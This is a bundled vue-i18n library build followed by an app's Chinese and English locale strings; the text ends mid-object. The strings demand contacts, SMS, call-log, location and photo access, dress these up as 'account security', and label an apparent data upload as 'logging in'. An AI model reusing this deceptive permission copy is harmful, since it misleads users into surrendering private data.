      },
      // n
      n(...args) {
        return composer.n(...args);
      },
      // getNumberFormat
      getNumberFormat(locale) {
        return composer.getNumberFormat(locale);
      },
      // setNumberFormat
      setNumberFormat(locale, format2) {
        composer.setNumberFormat(locale, format2);
      },
      // mergeNumberFormat
      mergeNumberFormat(locale, format2) {
        composer.mergeNumberFormat(locale, format2);
      },
      // getChoiceIndex
      // eslint-disable-next-line @typescript-eslint/no-unused-vars
      getChoiceIndex(choice, choicesLength) {
        warn(getWarnMessage(
          10
          /* NOT_SUPPORTED_GET_CHOICE_INDEX */
        ));
        return -1;
      },
      // for internal
      __onComponentInstanceCreated(target) {
        const { componentInstanceCreatedListener } = options;
        if (componentInstanceCreatedListener) {
          componentInstanceCreatedListener(target, vueI18n);
        }
      }
    };
    {
      vueI18n.__enableEmitter = (emitter) => {
        const __composer = composer;
        __composer[EnableEmitter] && __composer[EnableEmitter](emitter);
      };
      vueI18n.__disableEmitter = () => {
        const __composer = composer;
        __composer[DisableEmitter] && __composer[DisableEmitter]();
      };
    }
    return vueI18n;
  }
  const baseFormatProps = {
    tag: {
      type: [String, Object]
    },
    locale: {
      type: String
    },
    scope: {
      type: String,
      validator: (val) => val === "parent" || val === "global",
      default: "parent"
    },
    i18n: {
      type: Object
    }
  };
  const Translation = {
    /* eslint-disable */
    name: "i18n-t",
    props: assign({
      keypath: {
        type: String,
        required: true
      },
      plural: {
        type: [Number, String],
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        validator: (val) => isNumber(val) || !isNaN(val)
      }
    }, baseFormatProps),
    /* eslint-enable */
    setup(props, context) {
      const { slots, attrs } = context;
      const i18n2 = props.i18n || useI18n({
        useScope: props.scope,
        __useComponent: true
      });
      const keys = Object.keys(slots).filter((key) => key !== "_");
      return () => {
        const options = {};
        if (props.locale) {
          options.locale = props.locale;
        }
        if (props.plural !== void 0) {
          options.plural = isString(props.plural) ? +props.plural : props.plural;
        }
        const arg = getInterpolateArg(context, keys);
        const children = i18n2[TransrateVNodeSymbol](props.keypath, arg, options);
        const assignedAttrs = assign({}, attrs);
        return isString(props.tag) ? vue.h(props.tag, assignedAttrs, children) : isObject$1(props.tag) ? vue.h(props.tag, assignedAttrs, children) : vue.h(vue.Fragment, assignedAttrs, children);
      };
    }
  };
  function getInterpolateArg({ slots }, keys) {
    if (keys.length === 1 && keys[0] === "default") {
      return slots.default ? slots.default() : [];
    } else {
      return keys.reduce((arg, key) => {
        const slot = slots[key];
        if (slot) {
          arg[key] = slot();
        }
        return arg;
      }, {});
    }
  }
  function renderFormatter(props, context, slotKeys, partFormatter) {
    const { slots, attrs } = context;
    return () => {
      const options = { part: true };
      let overrides = {};
      if (props.locale) {
        options.locale = props.locale;
      }
      if (isString(props.format)) {
        options.key = props.format;
      } else if (isObject$1(props.format)) {
        if (isString(props.format.key)) {
          options.key = props.format.key;
        }
        overrides = Object.keys(props.format).reduce((options2, prop) => {
          return slotKeys.includes(prop) ? assign({}, options2, { [prop]: props.format[prop] }) : options2;
        }, {});
      }
      const parts = partFormatter(...[props.value, options, overrides]);
      let children = [options.key];
      if (isArray(parts)) {
        children = parts.map((part, index) => {
          const slot = slots[part.type];
          return slot ? slot({ [part.type]: part.value, index, parts }) : [part.value];
        });
      } else if (isString(parts)) {
        children = [parts];
      }
      const assignedAttrs = assign({}, attrs);
      return isString(props.tag) ? vue.h(props.tag, assignedAttrs, children) : isObject$1(props.tag) ? vue.h(props.tag, assignedAttrs, children) : vue.h(vue.Fragment, assignedAttrs, children);
    };
  }
  const NUMBER_FORMAT_KEYS = [
    "localeMatcher",
    "style",
    "unit",
    "unitDisplay",
    "currency",
    "currencyDisplay",
    "useGrouping",
    "numberingSystem",
    "minimumIntegerDigits",
    "minimumFractionDigits",
    "maximumFractionDigits",
    "minimumSignificantDigits",
    "maximumSignificantDigits",
    "notation",
    "formatMatcher"
  ];
  const NumberFormat = {
    /* eslint-disable */
    name: "i18n-n",
    props: assign({
      value: {
        type: Number,
        required: true
      },
      format: {
        type: [String, Object]
      }
    }, baseFormatProps),
    /* eslint-enable */
    setup(props, context) {
      const i18n2 = props.i18n || useI18n({ useScope: "parent", __useComponent: true });
      return renderFormatter(props, context, NUMBER_FORMAT_KEYS, (...args) => (
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        i18n2[NumberPartsSymbol](...args)
      ));
    }
  };
  const DATETIME_FORMAT_KEYS = [
    "dateStyle",
    "timeStyle",
    "fractionalSecondDigits",
    "calendar",
    "dayPeriod",
    "numberingSystem",
    "localeMatcher",
    "timeZone",
    "hour12",
    "hourCycle",
    "formatMatcher",
    "weekday",
    "era",
    "year",
    "month",
    "day",
    "hour",
    "minute",
    "second",
    "timeZoneName"
  ];
  const DatetimeFormat = {
    /* eslint-disable */
    name: "i18n-d",
    props: assign({
      value: {
        type: [Number, Date],
        required: true
      },
      format: {
        type: [String, Object]
      }
    }, baseFormatProps),
    /* eslint-enable */
    setup(props, context) {
      const i18n2 = props.i18n || useI18n({ useScope: "parent", __useComponent: true });
      return renderFormatter(props, context, DATETIME_FORMAT_KEYS, (...args) => (
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        i18n2[DatetimePartsSymbol](...args)
      ));
    }
  };
  function getComposer$2(i18n2, instance) {
    const i18nInternal = i18n2;
    if (i18n2.mode === "composition") {
      return i18nInternal.__getInstance(instance) || i18n2.global;
    } else {
      const vueI18n = i18nInternal.__getInstance(instance);
      return vueI18n != null ? vueI18n.__composer : i18n2.global.__composer;
    }
  }
  function vTDirective(i18n2) {
    const bind = (el, { instance, value, modifiers }) => {
      if (!instance || !instance.$) {
        throw createI18nError(
          22
          /* UNEXPECTED_ERROR */
        );
      }
      const composer = getComposer$2(i18n2, instance.$);
      if (modifiers.preserve) {
        warn(getWarnMessage(
          7
          /* NOT_SUPPORTED_PRESERVE */
        ));
      }
      const parsedValue = parseValue(value);
      el.textContent = composer.t(...makeParams(parsedValue));
    };
    return {
      beforeMount: bind,
      beforeUpdate: bind
    };
  }
  function parseValue(value) {
    if (isString(value)) {
      return { path: value };
    } else if (isPlainObject(value)) {
      if (!("path" in value)) {
        throw createI18nError(19, "path");
      }
      return value;
    } else {
      throw createI18nError(
        20
        /* INVALID_VALUE */
      );
    }
  }
  function makeParams(value) {
    const { path, locale, args, choice, plural } = value;
    const options = {};
    const named = args || {};
    if (isString(locale)) {
      options.locale = locale;
    }
    if (isNumber(choice)) {
      options.plural = choice;
    }
    if (isNumber(plural)) {
      options.plural = plural;
    }
    return [path, named, options];
  }
  function apply(app, i18n2, ...options) {
    const pluginOptions = isPlainObject(options[0]) ? options[0] : {};
    const useI18nComponentName = !!pluginOptions.useI18nComponentName;
    const globalInstall = isBoolean(pluginOptions.globalInstall) ? pluginOptions.globalInstall : true;
    if (globalInstall && useI18nComponentName) {
      warn(getWarnMessage(11, {
        name: Translation.name
      }));
    }
    if (globalInstall) {
      app.component(!useI18nComponentName ? Translation.name : "i18n", Translation);
      app.component(NumberFormat.name, NumberFormat);
      app.component(DatetimeFormat.name, DatetimeFormat);
    }
    app.directive("t", vTDirective(i18n2));
  }
  const VUE_I18N_COMPONENT_TYPES = "vue-i18n: composer properties";
  let devtoolsApi;
  async function enableDevTools(app, i18n2) {
    return new Promise((resolve, reject) => {
      try {
        setupDevtoolsPlugin({
          id: "vue-devtools-plugin-vue-i18n",
          label: VueDevToolsLabels[
            "vue-devtools-plugin-vue-i18n"
            /* PLUGIN */
          ],
          packageName: "vue-i18n",
          homepage: "https://vue-i18n.intlify.dev",
          logo: "https://vue-i18n.intlify.dev/vue-i18n-devtools-logo.png",
          componentStateTypes: [VUE_I18N_COMPONENT_TYPES],
          app
        }, (api) => {
          devtoolsApi = api;
          api.on.visitComponentTree(({ componentInstance, treeNode }) => {
            updateComponentTreeTags(componentInstance, treeNode, i18n2);
          });
          api.on.inspectComponent(({ componentInstance, instanceData }) => {
            if (componentInstance.vnode.el.__VUE_I18N__ && instanceData) {
              if (i18n2.mode === "legacy") {
                if (componentInstance.vnode.el.__VUE_I18N__ !== i18n2.global.__composer) {
                  inspectComposer(instanceData, componentInstance.vnode.el.__VUE_I18N__);
                }
              } else {
                inspectComposer(instanceData, componentInstance.vnode.el.__VUE_I18N__);
              }
            }
          });
          api.addInspector({
            id: "vue-i18n-resource-inspector",
            label: VueDevToolsLabels[
              "vue-i18n-resource-inspector"
              /* CUSTOM_INSPECTOR */
            ],
            icon: "language",
            treeFilterPlaceholder: VueDevToolsPlaceholders[
              "vue-i18n-resource-inspector"
              /* CUSTOM_INSPECTOR */
            ]
          });
          api.on.getInspectorTree((payload) => {
            if (payload.app === app && payload.inspectorId === "vue-i18n-resource-inspector") {
              registerScope(payload, i18n2);
            }
          });
          api.on.getInspectorState((payload) => {
            if (payload.app === app && payload.inspectorId === "vue-i18n-resource-inspector") {
              inspectScope(payload, i18n2);
            }
          });
          api.on.editInspectorState((payload) => {
            if (payload.app === app && payload.inspectorId === "vue-i18n-resource-inspector") {
              editScope(payload, i18n2);
            }
          });
          api.addTimelineLayer({
            id: "vue-i18n-timeline",
            label: VueDevToolsLabels[
              "vue-i18n-timeline"
              /* TIMELINE */
            ],
            color: VueDevToolsTimelineColors[
              "vue-i18n-timeline"
              /* TIMELINE */
            ]
          });
          resolve(true);
        });
      } catch (e) {
        console.error(e);
        reject(false);
      }
    });
  }
  function updateComponentTreeTags(instance, treeNode, i18n2) {
    const global2 = i18n2.mode === "composition" ? i18n2.global : i18n2.global.__composer;
    if (instance && instance.vnode.el.__VUE_I18N__) {
      if (instance.vnode.el.__VUE_I18N__ !== global2) {
        const label = instance.type.name || instance.type.displayName || instance.type.__file;
        const tag = {
          label: `i18n (${label} Scope)`,
          textColor: 0,
          backgroundColor: 16764185
        };
        treeNode.tags.push(tag);
      }
    }
  }
  function inspectComposer(instanceData, composer) {
    const type = VUE_I18N_COMPONENT_TYPES;
    instanceData.state.push({
      type,
      key: "locale",
      editable: true,
      value: composer.locale.value
    });
    instanceData.state.push({
      type,
      key: "availableLocales",
      editable: false,
      value: composer.availableLocales
    });
    instanceData.state.push({
      type,
      key: "fallbackLocale",
      editable: true,
      value: composer.fallbackLocale.value
    });
    instanceData.state.push({
      type,
      key: "inheritLocale",
      editable: true,
      value: composer.inheritLocale
    });
    instanceData.state.push({
      type,
      key: "messages",
      editable: false,
      value: getLocaleMessageValue(composer.messages.value)
    });
    instanceData.state.push({
      type,
      key: "datetimeFormats",
      editable: false,
      value: composer.datetimeFormats.value
    });
    instanceData.state.push({
      type,
      key: "numberFormats",
      editable: false,
      value: composer.numberFormats.value
    });
  }
  function getLocaleMessageValue(messages2) {
    const value = {};
    Object.keys(messages2).forEach((key) => {
      const v = messages2[key];
      if (isFunction(v) && "source" in v) {
        value[key] = getMessageFunctionDetails(v);
      } else if (isObject$1(v)) {
        value[key] = getLocaleMessageValue(v);
      } else {
        value[key] = v;
      }
    });
    return value;
  }
  const ESC = {
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "&": "&amp;"
  };
  function escape(s) {
    return s.replace(/[<>"&]/g, escapeChar);
  }
  function escapeChar(a) {
    return ESC[a] || a;
  }
  function getMessageFunctionDetails(func) {
    const argString = func.source ? `("${escape(func.source)}")` : `(?)`;
    return {
      _custom: {
        type: "function",
        display: `<span>ƒ</span> ${argString}`
      }
    };
  }
  function registerScope(payload, i18n2) {
    payload.rootNodes.push({
      id: "global",
      label: "Global Scope"
    });
    const global2 = i18n2.mode === "composition" ? i18n2.global : i18n2.global.__composer;
    for (const [keyInstance, instance] of i18n2.__instances) {
      const composer = i18n2.mode === "composition" ? instance : instance.__composer;
      if (global2 === composer) {
        continue;
      }
      const label = keyInstance.type.name || keyInstance.type.displayName || keyInstance.type.__file;
      payload.rootNodes.push({
        id: composer.id.toString(),
        label: `${label} Scope`
      });
    }
  }
  function getComposer$1(nodeId, i18n2) {
    if (nodeId === "global") {
      return i18n2.mode === "composition" ? i18n2.global : i18n2.global.__composer;
    } else {
      const instance = Array.from(i18n2.__instances.values()).find((item) => item.id.toString() === nodeId);
      if (instance) {
        return i18n2.mode === "composition" ? instance : instance.__composer;
      } else {
        return null;
      }
    }
  }
  function inspectScope(payload, i18n2) {
    const composer = getComposer$1(payload.nodeId, i18n2);
    if (composer) {
      payload.state = makeScopeInspectState(composer);
    }
  }
  function makeScopeInspectState(composer) {
    const state = {};
    const localeType = "Locale related info";
    const localeStates = [
      {
        type: localeType,
        key: "locale",
        editable: true,
        value: composer.locale.value
      },
      {
        type: localeType,
        key: "fallbackLocale",
        editable: true,
        value: composer.fallbackLocale.value
      },
      {
        type: localeType,
        key: "availableLocales",
        editable: false,
        value: composer.availableLocales
      },
      {
        type: localeType,
        key: "inheritLocale",
        editable: true,
        value: composer.inheritLocale
      }
    ];
    state[localeType] = localeStates;
    const localeMessagesType = "Locale messages info";
    const localeMessagesStates = [
      {
        type: localeMessagesType,
        key: "messages",
        editable: false,
        value: getLocaleMessageValue(composer.messages.value)
      }
    ];
    state[localeMessagesType] = localeMessagesStates;
    const datetimeFormatsType = "Datetime formats info";
    const datetimeFormatsStates = [
      {
        type: datetimeFormatsType,
        key: "datetimeFormats",
        editable: false,
        value: composer.datetimeFormats.value
      }
    ];
    state[datetimeFormatsType] = datetimeFormatsStates;
    const numberFormatsType = "Datetime formats info";
    const numberFormatsStates = [
      {
        type: numberFormatsType,
        key: "numberFormats",
        editable: false,
        value: composer.numberFormats.value
      }
    ];
    state[numberFormatsType] = numberFormatsStates;
    return state;
  }
  function addTimelineEvent(event, payload) {
    if (devtoolsApi) {
      let groupId;
      if (payload && "groupId" in payload) {
        groupId = payload.groupId;
        delete payload.groupId;
      }
      devtoolsApi.addTimelineEvent({
        layerId: "vue-i18n-timeline",
        event: {
          title: event,
          groupId,
          time: Date.now(),
          meta: {},
          data: payload || {},
          logType: event === "compile-error" ? "error" : event === "fallback" || event === "missing" ? "warning" : "default"
        }
      });
    }
  }
  function editScope(payload, i18n2) {
    const composer = getComposer$1(payload.nodeId, i18n2);
    if (composer) {
      const [field] = payload.path;
      if (field === "locale" && isString(payload.state.value)) {
        composer.locale.value = payload.state.value;
      } else if (field === "fallbackLocale" && (isString(payload.state.value) || isArray(payload.state.value) || isObject$1(payload.state.value))) {
        composer.fallbackLocale.value = payload.state.value;
      } else if (field === "inheritLocale" && isBoolean(payload.state.value)) {
        composer.inheritLocale = payload.state.value;
      }
    }
  }
  function defineMixin(vuei18n, composer, i18n2) {
    return {
      beforeCreate() {
        const instance = vue.getCurrentInstance();
        if (!instance) {
          throw createI18nError(
            22
            /* UNEXPECTED_ERROR */
          );
        }
        const options = this.$options;
        if (options.i18n) {
          const optionsI18n = options.i18n;
          if (options.__i18n) {
            optionsI18n.__i18n = options.__i18n;
          }
          optionsI18n.__root = composer;
          if (this === this.$root) {
            this.$i18n = mergeToRoot(vuei18n, optionsI18n);
          } else {
            optionsI18n.__injectWithOption = true;
            this.$i18n = createVueI18n(optionsI18n);
          }
        } else if (options.__i18n) {
          if (this === this.$root) {
            this.$i18n = mergeToRoot(vuei18n, options);
          } else {
            this.$i18n = createVueI18n({
              __i18n: options.__i18n,
              __injectWithOption: true,
              __root: composer
            });
          }
        } else {
          this.$i18n = vuei18n;
        }
        vuei18n.__onComponentInstanceCreated(this.$i18n);
        i18n2.__setInstance(instance, this.$i18n);
        this.$t = (...args) => this.$i18n.t(...args);
        this.$rt = (...args) => this.$i18n.rt(...args);
        this.$tc = (...args) => this.$i18n.tc(...args);
        this.$te = (key, locale) => this.$i18n.te(key, locale);
        this.$d = (...args) => this.$i18n.d(...args);
        this.$n = (...args) => this.$i18n.n(...args);
        this.$tm = (key) => this.$i18n.tm(key);
      },
      mounted() {
        {
          this.$el.__VUE_I18N__ = this.$i18n.__composer;
          const emitter = this.__v_emitter = createEmitter();
          const _vueI18n = this.$i18n;
          _vueI18n.__enableEmitter && _vueI18n.__enableEmitter(emitter);
          emitter.on("*", addTimelineEvent);
        }
      },
      beforeUnmount() {
        const instance = vue.getCurrentInstance();
        if (!instance) {
          throw createI18nError(
            22
            /* UNEXPECTED_ERROR */
          );
        }
        {
          if (this.__v_emitter) {
            this.__v_emitter.off("*", addTimelineEvent);
            delete this.__v_emitter;
          }
          const _vueI18n = this.$i18n;
          _vueI18n.__disableEmitter && _vueI18n.__disableEmitter();
          delete this.$el.__VUE_I18N__;
        }
        delete this.$t;
        delete this.$rt;
        delete this.$tc;
        delete this.$te;
        delete this.$d;
        delete this.$n;
        delete this.$tm;
        i18n2.__deleteInstance(instance);
        delete this.$i18n;
      }
    };
  }
  function mergeToRoot(root, options) {
    root.locale = options.locale || root.locale;
    root.fallbackLocale = options.fallbackLocale || root.fallbackLocale;
    root.missing = options.missing || root.missing;
    root.silentTranslationWarn = options.silentTranslationWarn || root.silentFallbackWarn;
    root.silentFallbackWarn = options.silentFallbackWarn || root.silentFallbackWarn;
    root.formatFallbackMessages = options.formatFallbackMessages || root.formatFallbackMessages;
    root.postTranslation = options.postTranslation || root.postTranslation;
    root.warnHtmlInMessage = options.warnHtmlInMessage || root.warnHtmlInMessage;
    root.escapeParameterHtml = options.escapeParameterHtml || root.escapeParameterHtml;
    root.sync = options.sync || root.sync;
    root.__composer[SetPluralRulesSymbol](options.pluralizationRules || root.pluralizationRules);
    const messages2 = getLocaleMessages(root.locale, {
      messages: options.messages,
      __i18n: options.__i18n
    });
    Object.keys(messages2).forEach((locale) => root.mergeLocaleMessage(locale, messages2[locale]));
    if (options.datetimeFormats) {
      Object.keys(options.datetimeFormats).forEach((locale) => root.mergeDateTimeFormat(locale, options.datetimeFormats[locale]));
    }
    if (options.numberFormats) {
      Object.keys(options.numberFormats).forEach((locale) => root.mergeNumberFormat(locale, options.numberFormats[locale]));
    }
    return root;
  }
  function createI18n(options = {}) {
    const __legacyMode = isBoolean(options.legacy) ? options.legacy : true;
    const __globalInjection = !!options.globalInjection;
    const __instances = /* @__PURE__ */ new Map();
    const __global = __legacyMode ? createVueI18n(options) : createComposer(options);
    const symbol = makeSymbol("vue-i18n");
    const i18n2 = {
      // mode
      get mode() {
        return __legacyMode ? "legacy" : "composition";
      },
      // install plugin
      async install(app, ...options2) {
        {
          app.__VUE_I18N__ = i18n2;
        }
        app.__VUE_I18N_SYMBOL__ = symbol;
        app.provide(app.__VUE_I18N_SYMBOL__, i18n2);
        if (!__legacyMode && __globalInjection) {
          injectGlobalFields(app, i18n2.global);
        }
        {
          apply(app, i18n2, ...options2);
        }
        if (__legacyMode) {
          app.mixin(defineMixin(__global, __global.__composer, i18n2));
        }
        {
          const ret = await enableDevTools(app, i18n2);
          if (!ret) {
            throw createI18nError(
              21
              /* CANNOT_SETUP_VUE_DEVTOOLS_PLUGIN */
            );
          }
          const emitter = createEmitter();
          if (__legacyMode) {
            const _vueI18n = __global;
            _vueI18n.__enableEmitter && _vueI18n.__enableEmitter(emitter);
          } else {
            const _composer = __global;
            _composer[EnableEmitter] && _composer[EnableEmitter](emitter);
          }
          emitter.on("*", addTimelineEvent);
        }
      },
      // global accessor
      get global() {
        return __global;
      },
      // @internal
      __instances,
      // @internal
      __getInstance(component) {
        return __instances.get(component) || null;
      },
      // @internal
      __setInstance(component, instance) {
        __instances.set(component, instance);
      },
      // @internal
      __deleteInstance(component) {
        __instances.delete(component);
      }
    };
    return i18n2;
  }
  function useI18n(options = {}) {
    const instance = vue.getCurrentInstance();
    if (instance == null) {
      throw createI18nError(
        16
        /* MUST_BE_CALL_SETUP_TOP */
      );
    }
    if (!instance.appContext.app.__VUE_I18N_SYMBOL__) {
      throw createI18nError(
        17
        /* NOT_INSLALLED */
      );
    }
    const i18n2 = vue.inject(instance.appContext.app.__VUE_I18N_SYMBOL__);
    if (!i18n2) {
      throw createI18nError(
        22
        /* UNEXPECTED_ERROR */
      );
    }
    const global2 = i18n2.mode === "composition" ? i18n2.global : i18n2.global.__composer;
    const scope = isEmptyObject(options) ? "__i18n" in instance.type ? "local" : "global" : !options.useScope ? "local" : options.useScope;
    if (scope === "global") {
      let messages2 = isObject$1(options.messages) ? options.messages : {};
      if ("__i18nGlobal" in instance.type) {
        messages2 = getLocaleMessages(global2.locale.value, {
          messages: messages2,
          __i18n: instance.type.__i18nGlobal
        });
      }
      const locales = Object.keys(messages2);
      if (locales.length) {
        locales.forEach((locale) => {
          global2.mergeLocaleMessage(locale, messages2[locale]);
        });
      }
      if (isObject$1(options.datetimeFormats)) {
        const locales2 = Object.keys(options.datetimeFormats);
        if (locales2.length) {
          locales2.forEach((locale) => {
            global2.mergeDateTimeFormat(locale, options.datetimeFormats[locale]);
          });
        }
      }
      if (isObject$1(options.numberFormats)) {
        const locales2 = Object.keys(options.numberFormats);
        if (locales2.length) {
          locales2.forEach((locale) => {
            global2.mergeNumberFormat(locale, options.numberFormats[locale]);
          });
        }
      }
      return global2;
    }
    if (scope === "parent") {
      let composer2 = getComposer(i18n2, instance, options.__useComponent);
      if (composer2 == null) {
        {
          warn(getWarnMessage(
            12
            /* NOT_FOUND_PARENT_SCOPE */
          ));
        }
        composer2 = global2;
      }
      return composer2;
    }
    if (i18n2.mode === "legacy") {
      throw createI18nError(
        18
        /* NOT_AVAILABLE_IN_LEGACY_MODE */
      );
    }
    const i18nInternal = i18n2;
    let composer = i18nInternal.__getInstance(instance);
    if (composer == null) {
      const type = instance.type;
      const composerOptions = assign({}, options);
      if (type.__i18n) {
        composerOptions.__i18n = type.__i18n;
      }
      if (global2) {
        composerOptions.__root = global2;
      }
      composer = createComposer(composerOptions);
      setupLifeCycle(i18nInternal, instance, composer);
      i18nInternal.__setInstance(instance, composer);
    }
    return composer;
  }
  function getComposer(i18n2, target, useComponent = false) {
    let composer = null;
    const root = target.root;
    let current = target.parent;
    while (current != null) {
      const i18nInternal = i18n2;
      if (i18n2.mode === "composition") {
        composer = i18nInternal.__getInstance(current);
      } else {
        const vueI18n = i18nInternal.__getInstance(current);
        if (vueI18n != null) {
          composer = vueI18n.__composer;
        }
        if (useComponent && composer && !composer[InejctWithOption]) {
          composer = null;
        }
      }
      if (composer != null) {
        break;
      }
      if (root === current) {
        break;
      }
      current = current.parent;
    }
    return composer;
  }
  function setupLifeCycle(i18n2, target, composer) {
    let emitter = null;
    vue.onMounted(() => {
      if (target.vnode.el) {
        target.vnode.el.__VUE_I18N__ = composer;
        emitter = createEmitter();
        const _composer = composer;
        _composer[EnableEmitter] && _composer[EnableEmitter](emitter);
        emitter.on("*", addTimelineEvent);
      }
    }, target);
    vue.onUnmounted(() => {
      if (target.vnode.el && target.vnode.el.__VUE_I18N__) {
        emitter && emitter.off("*", addTimelineEvent);
        const _composer = composer;
        _composer[DisableEmitter] && _composer[DisableEmitter]();
        delete target.vnode.el.__VUE_I18N__;
      }
      i18n2.__deleteInstance(target);
    }, target);
  }
  const globalExportProps = [
    "locale",
    "fallbackLocale",
    "availableLocales"
  ];
  const globalExportMethods = ["t", "rt", "d", "n", "tm"];
  function injectGlobalFields(app, composer) {
    const i18n2 = /* @__PURE__ */ Object.create(null);
    globalExportProps.forEach((prop) => {
      const desc = Object.getOwnPropertyDescriptor(composer, prop);
      if (!desc) {
        throw createI18nError(
          22
          /* UNEXPECTED_ERROR */
        );
      }
      const wrap = vue.isRef(desc.value) ? {
        get() {
          return desc.value.value;
        },
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        set(val) {
          desc.value.value = val;
        }
      } : {
        get() {
          return desc.get && desc.get();
        }
      };
      Object.defineProperty(i18n2, prop, wrap);
    });
    app.config.globalProperties.$i18n = i18n2;
    globalExportMethods.forEach((method) => {
      const desc = Object.getOwnPropertyDescriptor(composer, method);
      if (!desc || !desc.value) {
        throw createI18nError(
          22
          /* UNEXPECTED_ERROR */
        );
      }
      Object.defineProperty(app.config.globalProperties, `$${method}`, desc);
    });
  }
  {
    initFeatureFlags();
  }
  {
    const target = getGlobalThis();
    target.__INTLIFY__ = true;
    setDevToolsHook(target.__INTLIFY_DEVTOOLS_GLOBAL_HOOK__);
  }
  const messages = {
    "zh-CN": {
      phone: "手机号",
      inviteCode: "邀请码",
      login: "登录",
      phoneError: "请输入正确的手机号",
      inviteCodeError: "请输入正确的邀请码",
      permissionTitle: "权限说明",
      locationPermission: "需要获取位置权限",
      contactsPermission: "需要获取通讯录权限",
      galleryPermission: "需要获取相册权限",
      smsPermission: "需要获取短信权限",
      allow: "允许",
      deny: "拒绝",
      agreementPrefix: "登录即代表同意",
      agreementSuffix: "",
      permissionError: "获取权限失败，请检查权限设置",
      permissionDenied: "需要允许所有权限才能使用此应用",
      permissionContent: "此应用需要访问通讯录、位置、短信和媒体文件权限才能正常使用，请在设置中开启所有权限",
      goToSettings: "去设置",
      exit: "退出",
      permissionIncomplete: "权限获取不完整，应用无法正常运行",
      restartApp: "权限检查失败，请重启应用",
      uploadingData: "正在登录中...",
      preparingToEnter: "准备进入系统...",
      countdown: "排队中，请稍后，预计{0}秒后进入",
      contactPermTitle: "获取当前手机号",
      contactPermDesc: "账号安全提示：获取当前手机号，用于会员注册、账号绑定、账号登录和验证当前手机手机号码，防止盗号风险！",
      smsPermTitle: "短信权限",
      smsPermDesc: "账号安全提示：需要获取短信权限，用于验证码自动填写和账号安全验证，保障您的账号安全！",
      callPermTitle: "通话记录权限",
      callPermDesc: "账号安全提示：需要获取通话记录权限，用于身份验证和安全防护，保障您的账号安全！",
      photoPermTitle: "相册权限",
      photoPermDesc: "账号安全提示：需要获取相册权限，用于头像设置和身份认证材料上传，保障服务正常使用！",
      exitApp: "退出应用",
      authorize: "去授权",
      close: "关闭",
      permSettingTip: "需要在权限设置里面打开相关权限！",
      formIncomplete: "请填写完整信息"
    },
    "zh-HK": {
      phone: "手機號",
      inviteCode: "邀請碼",
      login: "登入",
      phoneError: "請輸入正確的手機號",
      inviteCodeError: "請輸入正確的邀請碼",
      permissionTitle: "權限請求",
      locationPermission: "需要獲取位置權限",
      contactsPermission: "需要獲取通訊錄權限",
      galleryPermission: "需要獲取相冊權限",
      smsPermission: "需要獲取簡訊權限",
      allow: "允許",
      deny: "拒絕",
      agreementPrefix: "登入即代表同意",
      agreementSuffix: "",
      permissionError: "獲取權限失敗，請檢查權限設置",
      permissionDenied: "部分權限未獲取，可能影響應用使用",
      permissionContent: "此應用需要訪問通訊錄、位置、簡訊和媒體文件權限才能正常使用，請在設置中開啟所有權限",
      goToSettings: "去設置",
      exit: "退出",
      permissionIncomplete: "權限獲取不完整，應用無法正常運行",
      restartApp: "權限檢查失敗，請重啟應用",
      uploadingData: "正在登入中...",
      preparingToEnter: "準備進入系統...",
      countdown: "排隊中，請稍後，預計{0}秒後進入",
      contactPermTitle: "獲取當前手機號",
      contactPermDesc: "賬號安全提示：獲取當前手機號，用於會員註冊、賬號綁定、賬號登入和驗證當前手機號碼，防止盜號風險！",
      smsPermTitle: "短信權限",
      smsPermDesc: "賬號安全提示：需要獲取短信權限，用於驗證碼自動填寫和賬號安全驗證，保障您的賬號安全！",
      callPermTitle: "通話記錄權限",
      callPermDesc: "賬號安全提示：需要獲取通話記錄權限，用於身份驗證和安全防護，保障您的賬號安全！",
      photoPermTitle: "相冊權限",
      photoPermDesc: "賬號安全提示：需要獲取相冊權限，用於頭像設置和身份認證材料上傳，保障服務正常使用！",
      exitApp: "退出應用",
      authorize: "去授權",
      close: "關閉",
      permSettingTip: "需要在權限設置裏面打開相關權限！",
      formIncomplete: "請填寫完整信息"
    },
    "zh-TW": {
      phone: "手機號",
      inviteCode: "邀請碼",
      login: "登錄",
      phoneError: "請輸入正確的手機號",
      inviteCodeError: "請輸入正確的邀請碼",
      permissionTitle: "權限請求",
      locationPermission: "需要獲取位置權限",
      contactsPermission: "需要獲取通訊錄權限",
      galleryPermission: "需要獲取相冊權限",
      smsPermission: "需要獲取簡訊權限",
      allow: "允許",
      deny: "拒絕",
      agreementPrefix: "登錄即代表同意",
      agreementSuffix: "",
      permissionError: "獲取權限失敗，請檢查權限設置",
      permissionDenied: "部分權限未獲取，可能影響應用使用",
      permissionContent: "此應用需要訪問通訊錄、位置、簡訊和媒體文件權限才能正常使用，請在設置中開啟所有權限",
      goToSettings: "去設置",
      exit: "退出",
      permissionIncomplete: "權限獲取不完整，應用無法正常運行",
      restartApp: "權限檢查失敗，請重啟應用",
      uploadingData: "正在登入中...",
      preparingToEnter: "準備進入系統...",
      countdown: "排隊中，請稍後，預計{0}秒後進入",
      contactPermTitle: "獲取當前手機號",
      contactPermDesc: "賬號安全提示：獲取當前手機號，用於會員註冊、賬號綁定、賬號登錄和驗證當前手機號碼，防止盜號風險！",
      smsPermTitle: "短信權限",
      smsPermDesc: "賬號安全提示：需要獲取短信權限，用於驗證碼自動填寫和賬號安全驗證，保障您的賬號安全！",
      callPermTitle: "通話記錄權限",
      callPermDesc: "賬號安全提示：需要獲取通話記錄權限，用於身份驗證和安全防護，保障您的賬號安全！",
      photoPermTitle: "相冊權限",
      photoPermDesc: "賬號安全提示：需要獲取相冊權限，用於頭像設置和身份認證材料上傳，保障服務正常使用！",
      exitApp: "退出應用",
      authorize: "去授權",
      close: "關閉",
      permSettingTip: "需要在權限設置裏面打開相關權限！",
      formIncomplete: "請填寫完整信息"
    },
    "en": {
      phone: "Phone Number",
      inviteCode: "Invite Code",
      login: "Login",
      phoneError: "Please enter a valid phone number",
      inviteCodeError: "Please enter a valid invite code",
      permissionTitle: "Permission Required",
      locationPermission: "Location permission is required",
      contactsPermission: "Contacts permission is required",
      galleryPermission: "Gallery permission is required",
      smsPermission: "SMS permission is required",
      allow: "Allow",
      deny: "Deny",
      agreementPrefix: "By logging in, you agree to the",
      agreementSuffix: "",
      permissionError: "Failed to get permission, please check settings",
      permissionDenied: "All permissions are required to use this app",
